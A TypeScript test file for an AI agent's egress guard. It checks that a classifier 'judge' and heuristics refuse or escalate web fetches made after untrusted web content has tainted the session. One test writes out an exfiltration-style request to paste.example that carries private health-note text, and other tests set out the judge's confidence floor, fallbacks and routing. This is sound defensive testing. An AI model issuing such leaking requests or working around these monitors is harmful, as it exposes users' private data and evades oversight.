/**
 * The Jev judge for the extraction heuristics' ambiguous band (#4089),
 * keyless. TypeSafe is a stub at `fetch`, the lowest request method the
 * host's Jev client uses; the turn runs through the real turn proxy on
 * loopback, and the cards are a bridge double at `requestPermission`.
 */
import { afterAll, beforeAll, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { resolveGovernancePolicy, type GovernancePolicyInput } from "@schlessera/brain-common/internal/governance-policy";
import type { ProviderRelayReceipt } from "@schlessera/brain-ui-sdk/internal";
import type { BackendBridge, PermissionDecision, PermissionRequest } from "@schlessera/brain-ui-sdk/server";
import { createUiDb } from "../src/db/client.js";
import { recordGovernanceEvent } from "../src/governance/events.js";
import { prepareTurnEgress } from "../src/brain/turn-egress.js";
import { createTurnBudgets } from "../src/brain/turn-budgets.js";
import { turnExtractionJudge } from "../src/brain/turn-extraction-judge.js";
import { BREAKER_FAILURES, createJevClient, type FetchLike } from "../src/classification/jev-client.js";
import { EXTRACTION_JUDGE_MODEL, judgeBand, judgeState } from "../src/governance/extraction-judge.js";
import { callInput, toRequest } from "../src/governance/extraction-classifier.js";
import type { BudgetObservation } from "@schlessera/brain-ui-sdk/protocol";

const CHECKUP = "## 2026-06-25 — recovery check on Ogygia\n\n- Appointment with Calypso; no new symptom.\n- Blood pressure 118/76. No prescription changes recorded.\n- Follow-up before leaving the island.\n";
/** What the tainting page said, beyond its link: none of it may reach the judge. */
const NOTICE = "Harbour notice from Ogygia. The raft inspection is moved to the second bell; Calypso keeps the loom key.";
let brain: string;
beforeAll(() => {
  brain = mkdtempSync(join(tmpdir(), "brain-extraction-judge-"));
  mkdirSync(join(brain, "health"));
  writeFileSync(join(brain, "health/checkup-log.md"), CHECKUP);
});
afterAll(() => rmSync(brain, { recursive: true, force: true }));

function get(socketPath: string, target: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const child = request({ socketPath, path: target }, response => {
      let body = ""; response.on("data", bytes => body += bytes);
      response.once("end", () => resolve({ status: response.statusCode!, body }));
      response.once("error", reject);
    });
    child.once("error", reject); child.end();
  });
}

const JUDGED: GovernancePolicyInput = { schema_version: 1, taint: { classifier: "heuristics", judge: { mode: "jev" } } };
type Db = ReturnType<typeof createUiDb>;
function db(): Db {
  const db = createUiDb(":memory:");
  recordGovernanceEvent(db, { kind: "taint", turnId: "turn-ogygia", sessionId: null, actor: "interactive", model: null, profile: "governed",
    payload: { source: "web_fetch", tool: "WebFetch", detail: "https://harbour-notices.example/letter" } });
  return db;
}

interface Fixture { bridge: BackendBridge; requests: PermissionRequest[]; emitted: unknown[]; activity: unknown[]; answer(decision: PermissionDecision): void; asked: () => Promise<void> }
function fixture(): Fixture {
  const requests: PermissionRequest[] = [], waiting: Array<(decision: PermissionDecision) => void> = [], emitted: unknown[] = [], activity: unknown[] = [];
  let notify: () => void = () => {}, asked = new Promise<void>(resolve => { notify = resolve; });
  const bridge = { emit: (message: unknown) => { emitted.push(message); }, activity: (event: unknown) => { activity.push(event); },
    requestPermission: (request: PermissionRequest) => {
      requests.push(request);
      const pending = new Promise<PermissionDecision>(resolve => waiting.push(resolve));
      notify(); asked = new Promise(resolve => { notify = resolve; });
      return pending;
    },
    inputSafety: { ready: async () => {}, begin: async () => {}, result: async () => {}, refused: async () => {} },
  } as unknown as BackendBridge;
  return { bridge, requests, emitted, activity, answer: decision => waiting.shift()?.(decision), asked: () => asked };
}

/** What the stub answers next: a verdict, a whole response, or a request that never settles. */
type Reply = { choice: string; confidence: number; model?: string } | { response: () => Response } | "hang";
/** TypeSafe at `fetch`: every request body it received, and the replies it gives in order. */
function typesafe(replies: Reply[]) {
  const bodies: Array<Record<string, unknown>> = [], headers: Array<Record<string, string>> = [];
  const fetch: FetchLike = async (_url, init) => {
    bodies.push(JSON.parse(String(init.body)));
    headers.push(Object.fromEntries(new Headers(init.headers).entries()));
    const reply = replies.shift() ?? { response: () => new Response("unavailable", { status: 503 }) };
    if (reply === "hang") return new Promise<Response>((_, reject) => init.signal?.addEventListener("abort", () => reject(init.signal!.reason)));
    if ("response" in reply) return reply.response();
    return Response.json({ model: reply.model ?? EXTRACTION_JUDGE_MODEL, usage: { input_tokens: 700, output_tokens: 0 },
      answers: { verdict: { type: "choice", choice: reply.choice, confidence: reply.confidence, probabilities: { [reply.choice]: reply.confidence } } } });
  };
  return { fetch, bodies, headers };
}

interface Options { policy?: GovernancePolicyInput; origin?: "interactive" | "voice"; client?: ReturnType<typeof createJevClient>; sessionId?: string | null;
  budgets?: Parameters<typeof turnExtractionJudge>[0]["budgets"] | null; exposures?: Parameters<typeof turnExtractionJudge>[0]["exposures"] }
/** A tainted interactive turn with the judge wired as production wires it (`prepareRelayedEgress`). */
async function turn(store: Db, bridge: BackendBridge, stub: ReturnType<typeof typesafe>, options: Options = {}) {
  const policy = resolveGovernancePolicy(options.policy ?? JUDGED);
  const ledger = createTurnBudgets(store, { resolve: () => null });
  await ledger.begin("turn-ogygia", options.sessionId ?? undefined, policy);
  const receipts: ProviderRelayReceipt[] = [], observed: Array<Promise<unknown>> = [];
  const client = options.client ?? createJevClient({ apiKey: "fixture-typesafe-key", fetch: stub.fetch, production: true });
  const judge = turnExtractionJudge({ client, policy, turnId: "turn-ogygia", sessionId: () => options.sessionId ?? null,
    budgets: options.budgets === null ? undefined : options.budgets ?? ledger, stopped: () => null,
    ...(options.exposures ? { exposures: options.exposures } : {}),
    observe: receipt => { receipts.push(receipt); observed.push(ledger.observeProvider("turn-ogygia", receipt)); } });
  const proxy = await prepareTurnEgress({ controller: new AbortController(), policy, turnId: "turn-ogygia", sessionId: () => options.sessionId ?? null,
    model: () => "claude-haiku-4-5", profile: "governed", origin: options.origin ?? "interactive", bridge,
    record: event => recordGovernanceEvent(store, event), governanceDb: store, brainPath: brain, ...(judge ? { extractionJudge: judge } : {}) });
  return { proxy, safety: proxy.bridge.inputSafety!, receipts, ledger, settled: () => Promise.all(observed) };
}

async function raised(f: Fixture, pending: Promise<unknown>, label: string): Promise<void> {
  const asked = f.asked();
  const outcome = await Promise.race([asked.then(() => "asked" as const), pending.then(() => "settled" as const, () => "settled" as const)]);
  expect(outcome, label).toBe("asked");
}
async function admitted<T>(f: Fixture, pending: Promise<T>, label: string): Promise<T> {
  const asked = f.asked();
  const outcome = await Promise.race([asked.then(() => "asked" as const), pending.then(() => "settled" as const, () => "settled" as const)]);
  expect(outcome, label).toBe("settled");
  return pending;
}

/**
 * The session's first fetch reads the tainting page, which links the harbour;
 * then it reads the checkup note. A plain fetch of that link scores in the
 * ambiguous band: the taint host alone.
 */
async function primed(t: Awaited<ReturnType<typeof turn>>, harbour: URL): Promise<void> {
  await t.safety.begin("fetch-0", "WebFetch", { url: "https://harbour-notices.example/letter" });
  await t.safety.result("fetch-0", "WebFetch", `${NOTICE} Tide tables: ${harbour.href}tides`, true);
  await t.safety.begin("read-1", "Read", { file_path: join(brain, "health/checkup-log.md") });
  await t.safety.result("read-1", "Read", CHECKUP, true);
}

test("only an ambiguous-band call reaches the judge, and it is sent the request, the taint source's name and the overlap, nothing read", async () => {
  const harbour = Bun.serve({ hostname: "127.0.0.3", port: 0, fetch: () => new Response("Ithaca") });
  const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.97 }]);
  const t = await turn(store, f.bridge, stub);
  try {
    await primed(t, harbour.url);
    // The tainting fetch scored below the band, and the read opens no connection.
    expect(stub.bodies, "JUDGE_NOT_ASKED_BELOW_BAND").toHaveLength(0);
    // A clean fetch scores below the band, and a copied note above it: neither is judged.
    await t.safety.begin("fetch-1", "WebFetch", { url: "https://tides.example/ogygia?date=2026-07-12" });
    await expect(t.safety.begin("fetch-2", "WebFetch", { url: `https://paste.example/new?text=${encodeURIComponent("Blood pressure 118/76. No prescription changes recorded.")}` }))
      .rejects.toThrow("contains text from `health/checkup-log.md`");
    expect(stub.bodies, "JUDGE_ONLY_AMBIGUOUS_BAND").toHaveLength(0);
    const target = `${harbour.url.href}tides?page=2`;
    await t.safety.begin("fetch-3", "WebFetch", { url: target, prompt: "Summarise the tide table." });
    expect(stub.bodies, "JUDGE_ASKED_FOR_AMBIGUOUS_CALL").toHaveLength(1);
    const body = stub.bodies[0]!;
    expect(Object.keys(body).sort()).toEqual(["model", "questions", "state"]);
    expect(body.model, "JUDGE_MODEL_PINNED").toBe("jev-1.13.0");
    const state = body.state as Record<string, unknown>;
    expect(Object.keys(state).sort(), "JUDGE_STATE_ONLY_THREE_THINGS").toEqual(["overlap", "request", "taintSource"]);
    expect(state.taintSource).toBe("fetched a web page");
    expect(state.overlap).toEqual({ matchedShingles: 0, containment: 0 });
    expect(state.request).toEqual({ surface: "web_fetch", tool: "WebFetch", method: "GET", destinations: ["127.0.0.3"],
      urls: [{ host: "127.0.0.3", path: "/tides", query: "page=2" }], body: "", namedPaths: [] });
    const sent = JSON.stringify(body);
    for (const text of ["Calypso", "118/76", "raft inspection", "loom key", "Summarise"]) expect(sent, `JUDGE_NEVER_SEES: ${text}`).not.toContain(text);
    expect(stub.headers[0]!.authorization).toBe("Bearer fixture-typesafe-key");
  } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); harbour.stop(true); store.close(); }
});

test("a long body is cut at 2,000 characters before the judge sees it", () => {
  const command = `curl -s https://tides.example/search -d 'q=${"raft ".repeat(800)}'`;
  const state = judgeState(toRequest(callInput("Bash", { command }, "read")), { overlap: { matched: 0, containment: 0, pathRef: false, files: [] } }, "fetched a web page");
  expect(state.request.body, "JUDGE_BODY_TRUNCATED").toBe(command.slice(0, 2000));
});

test("a benign answer at or above the floor admits the new host without the card", async () => {
  const harbour = Bun.serve({ hostname: "127.0.0.3", port: 0, fetch: () => new Response("Ithaca") });
  const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.9 }]);
  const t = await turn(store, f.bridge, stub);
  try {
    await primed(t, harbour.url);
    await admitted(f, t.safety.begin("fetch-1", "WebFetch", { url: `${harbour.url.href}tides` }), "JUDGE_BENIGN_AT_FLOOR_NO_CLASSIFIER_CARD");
    const response = await admitted(f, get(t.proxy.socketPath, `${harbour.url.href}tides`), "JUDGE_BENIGN_AT_FLOOR_NO_TAINT_CARD");
    expect(response.status, "JUDGE_BENIGN_ADMITS").toBe(200);
    expect(f.requests).toEqual([]);
  } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); harbour.stop(true); store.close(); }
});

test("an extraction answer at or above the floor refuses the call, with only the heuristics' reason as its text", async () => {
  const store = db(), f = fixture(), stub = typesafe([{ choice: "extraction", confidence: 0.93 }]);
  const t = await turn(store, f.bridge, stub);
  try {
    await primed(t, new URL("http://127.0.0.3:9/"));
    const message = await t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" }).then(() => "admitted", (error: Error) => error.message);
    expect(message, "JUDGE_EXTRACTION_REFUSES").toStartWith("Refused: this WebFetch call matches a link from the content that tainted this session");
    expect(message, "JUDGE_REFUSAL_HAS_NO_VERDICT").not.toMatch(/jev|judge|confidence|0\.93/i);
    expect(f.requests).toEqual([]);
  } finally { t.proxy.stop(); store.close(); }
});

/** Each case that must leave the band on the card, with the client it needs. */
const ASKS: Array<{ label: string; replies: Reply[]; client?: (stub: ReturnType<typeof typesafe>) => ReturnType<typeof createJevClient>; calls: number }> = [
  { label: "JUDGE_SUB_FLOOR_BENIGN_ASKS", replies: [{ choice: "benign", confidence: 0.89 }], calls: 1 },
  { label: "JUDGE_SUSPICIOUS_ASKS", replies: [{ choice: "suspicious", confidence: 0.99 }], calls: 1 },
  { label: "JUDGE_SUB_FLOOR_EXTRACTION_ASKS", replies: [{ choice: "extraction", confidence: 0.85 }], calls: 1 },
  { label: "JUDGE_NO_ANSWER_ASKS", replies: [{ response: () => Response.json({ model: EXTRACTION_JUDGE_MODEL, usage: { input_tokens: 700, output_tokens: 0 }, answers: {} }) }], calls: 1 },
  { label: "JUDGE_HTTP_ERROR_ASKS", replies: [{ response: () => new Response("busy", { status: 529 }) }], calls: 1 },
  { label: "JUDGE_TIMEOUT_ASKS", replies: ["hang"], calls: 1,
    client: stub => createJevClient({ apiKey: "fixture-typesafe-key", fetch: stub.fetch, production: true, timeoutMs: 50 }) },
  { label: "JUDGE_OTHER_MODEL_ASKS", replies: [{ choice: "benign", confidence: 0.99, model: "jev-latest" }], calls: 1 },
  { label: "JUDGE_NO_KEY_ASKS", replies: [], calls: 0, client: stub => createJevClient({ apiKey: null, fetch: stub.fetch, production: true }) },
];

for (const item of ASKS) {
  test(`${item.label}: the band stays on the card`, async () => {
    const store = db(), f = fixture(), stub = typesafe([...item.replies]);
    const t = await turn(store, f.bridge, stub, item.client ? { client: item.client(stub) } : {});
    try {
      await primed(t, new URL("http://127.0.0.3:9/"));
      const pending = t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" });
      await raised(f, pending, item.label);
      expect(f.requests[0]!.description).toContain("matches a link from the content that tainted this session");
      expect(stub.bodies).toHaveLength(item.calls);
      f.answer({ behavior: "allow" });
      await pending;
    } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); store.close(); }
  });
}

test("an open breaker asks without calling", async () => {
  const stub = typesafe(Array.from({ length: BREAKER_FAILURES }, () => ({ response: () => new Response("down", { status: 500 }) })));
  const client = createJevClient({ apiKey: "fixture-typesafe-key", fetch: stub.fetch, production: true });
  for (let i = 0; i < BREAKER_FAILURES; i++) await client.classify({ model: EXTRACTION_JUDGE_MODEL, state: {}, questions: {} });
  expect(client.breaker().open).toBe(true);
  const store = db(), f = fixture();
  const t = await turn(store, f.bridge, stub, { client });
  try {
    await primed(t, new URL("http://127.0.0.3:9/"));
    const pending = t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" });
    await raised(f, pending, "JUDGE_OPEN_BREAKER_ASKS");
    expect(stub.bodies, "JUDGE_OPEN_BREAKER_NO_CALL").toHaveLength(BREAKER_FAILURES);
    expect(t.receipts, "JUDGE_OPEN_BREAKER_NO_RECEIPT").toEqual([]);
  } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); store.close(); }
});

test("each judge call is metered as its own operation against the turn, its conversation and its day", async () => {
  const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.97 }, { response: () => new Response("busy", { status: 503 }) }]);
  const t = await turn(store, f.bridge, stub, { sessionId: "ogygia-session" });
  try {
    await primed(t, new URL("http://127.0.0.3:9/"));
    await t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" });
    const second = t.safety.begin("fetch-2", "WebFetch", { url: "http://127.0.0.3:9/tides?page=3" });
    await raised(f, second, "JUDGE_FAILURE_ASKS");
    await t.settled();
    expect(t.receipts.map(r => [r.operation, r.outcome, r.status, r.usage]), "JUDGE_RECEIPTS").toEqual([
      ["extraction_judge", "dispatched", 0, null], ["extraction_judge", "completed", 200, { inputTokens: 700, outputTokens: 0 }],
      ["extraction_judge", "dispatched", 0, null], ["extraction_judge", "failed", 503, null],
    ]);
    expect(new Set(t.receipts.map(r => r.attemptId)).size, "ONE_ATTEMPT_ID_PER_CALL").toBe(2);
    expect(t.receipts.every(r => r.family === "typesafe" && r.origin === "https://api.typesafe.ai" && r.model === "jev-1.13.0")).toBe(true);
    const rows = store.query("SELECT turn_id, operation, outcome, tokens, cost_usd FROM provider_relay_usage ORDER BY observed_at").all();
    expect(rows, "JUDGE_METERED_ON_TURN").toEqual([
      { turn_id: "turn-ogygia", operation: "extraction_judge", outcome: "completed", tokens: 700, cost_usd: null },
      { turn_id: "turn-ogygia", operation: "extraction_judge", outcome: "failed", tokens: null, cost_usd: null },
    ]);
    const scopes = t.ledger.receipt("turn-ogygia").scopes;
    expect(scopes.map(scope => scope.scope)).toEqual(["turn", "session", "day"]);
    for (const scope of scopes) {
      expect(scope.tokens, `JUDGE_TOKENS_CHARGED_${scope.scope}`).toBe(700);
      expect(scope.costUsd, `JUDGE_COST_UNKNOWN_NOT_ZERO_${scope.scope}`).toBeNull();
    }
  } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); store.close(); }
});

test("an exhausted budget, or none to charge, asks without calling", async () => {
  const observation: BudgetObservation = { scope: "session", legacyRuns: 0, costUsd: 4, tokens: 0, unknownRuns: 0, warnUsd: 3, blockUsd: 4,
    blockTokens: 2000, warning: true, blocked: true };
  const blocked = { providerAdmission: async () => observation };
  for (const [label, budgets] of [["JUDGE_EXHAUSTED_BUDGET_ASKS", blocked], ["JUDGE_NO_LEDGER_ASKS", null]] as const) {
    const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.99 }]);
    const t = await turn(store, f.bridge, stub, { budgets });
    try {
      await primed(t, new URL("http://127.0.0.3:9/"));
      await raised(f, t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" }), label);
      expect(stub.bodies, `${label}_NO_CALL`).toEqual([]);
      expect(t.receipts).toEqual([]);
    } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); store.close(); }
  }
});

test("routing (G2): a conversation shown a folder the policy keeps from TypeSafe, or one it cannot judge, sends nothing", async () => {
  const policy: GovernancePolicyInput = { ...JUDGED, providers: [{ paths: ["health/**"], allow: ["anthropic"] }] };
  const cases = [
    { label: "JUDGE_ROUTING_REFUSES_SHOWN_FOLDER", sessionId: "ogygia-session", exposures: async () => [{ recipient: "anthropic", visible: ["health"], hidden: [] }] },
    { label: "JUDGE_ROUTING_REFUSES_UNKNOWN_EXPOSURE", sessionId: null, exposures: async () => [] },
  ];
  for (const item of cases) {
    const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.99 }]);
    const t = await turn(store, f.bridge, stub, { policy, sessionId: item.sessionId, exposures: item.exposures });
    try {
      await primed(t, new URL("http://127.0.0.3:9/"));
      await raised(f, t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" }), item.label);
      expect(stub.bodies, `${item.label}_NO_CALL`).toEqual([]);
    } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); store.close(); }
  }
  // A rule that allows TypeSafe, or a conversation shown nothing it keeps, is judged.
  const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.99 }]);
  const t = await turn(store, f.bridge, stub, { policy, sessionId: "ogygia-session", exposures: async () => [] });
  try {
    await primed(t, new URL("http://127.0.0.3:9/"));
    await admitted(f, t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" }), "JUDGE_ROUTING_ADMITS_UNSHOWN");
    expect(stub.bodies).toHaveLength(1);
  } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); store.close(); }
});

test("the judge runs only with the setting on beside the heuristics, and voice never calls it and keeps refusing", async () => {
  for (const [label, policy] of [["JUDGE_OFF_BY_DEFAULT", { schema_version: 1, taint: { classifier: "heuristics" } }],
    ["JUDGE_NEEDS_HEURISTICS", { schema_version: 1, taint: { judge: { mode: "jev" } } }]] as const) {
    expect(turnExtractionJudge({ client: createJevClient({ apiKey: "fixture-typesafe-key", fetch: typesafe([]).fetch }), policy: resolveGovernancePolicy(policy as GovernancePolicyInput),
      turnId: "turn-ogygia", sessionId: () => null, budgets: undefined, stopped: () => null, observe: () => {} }), label).toBeUndefined();
  }
  const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.99 }]);
  const t = await turn(store, f.bridge, stub, { origin: "voice" });
  try {
    await primed(t, new URL("http://127.0.0.3:9/"));
    await expect(t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" }), "JUDGE_VOICE_KEEPS_REFUSING").rejects.toThrow("Refused: this WebFetch call");
    expect(stub.bodies, "JUDGE_VOICE_NEVER_CALLS").toEqual([]);
    expect(f.requests).toEqual([]);
  } finally { t.proxy.stop(); store.close(); }
});

test("no verdict, answer or judge state reaches the conversation", async () => {
  const store = db(), f = fixture(), stub = typesafe([{ choice: "benign", confidence: 0.97 }, { choice: "suspicious", confidence: 0.97 }, { choice: "extraction", confidence: 0.97 }]);
  const t = await turn(store, f.bridge, stub);
  try {
    await primed(t, new URL("http://127.0.0.3:9/"));
    await t.safety.begin("fetch-1", "WebFetch", { url: "http://127.0.0.3:9/tides" });
    const asked = t.safety.begin("fetch-2", "WebFetch", { url: "http://127.0.0.3:9/tides?page=2" });
    await raised(f, asked, "JUDGE_SUSPICIOUS_CARD");
    f.answer({ behavior: "deny", message: "No" });
    await expect(asked).rejects.toThrow();
    await expect(t.safety.begin("fetch-3", "WebFetch", { url: "http://127.0.0.3:9/tides?page=3" })).rejects.toThrow();
    expect(f.emitted, "JUDGE_EMITS_NOTHING").toEqual([]);
    expect(f.activity, "JUDGE_REPORTS_NO_ACTIVITY").toEqual([]);
    expect(JSON.stringify(f.requests), "JUDGE_CARD_HAS_NO_VERDICT").not.toMatch(/jev|suspicious|confidence|0\.97/i);
  } finally { f.answer({ behavior: "deny", message: "Fixture cleanup" }); t.proxy.stop(); store.close(); }
});

test("the band mapping needs the floor for both allow and refuse", () => {
  expect(judgeBand({ choice: "benign", confidence: 0.9 }, 0.9), "FLOOR_BENIGN_AT").toBe("allow");
  expect(judgeBand({ choice: "benign", confidence: 0.899 }, 0.9), "FLOOR_BENIGN_BELOW").toBe("ask");
  expect(judgeBand({ choice: "extraction", confidence: 0.9 }, 0.9), "FLOOR_EXTRACTION_AT").toBe("block");
  expect(judgeBand({ choice: "extraction", confidence: 0.5 }, 0.9), "FLOOR_EXTRACTION_BELOW").toBe("ask");
  expect(judgeBand({ choice: "suspicious", confidence: 1 }, 0.9)).toBe("ask");
  expect(judgeBand(null, 0.9), "NO_ANSWER_ASKS").toBe("ask");
  expect(judgeBand({ choice: "benign", confidence: Number.NaN }, 0.9), "NAN_ASKS").toBe("ask");
});
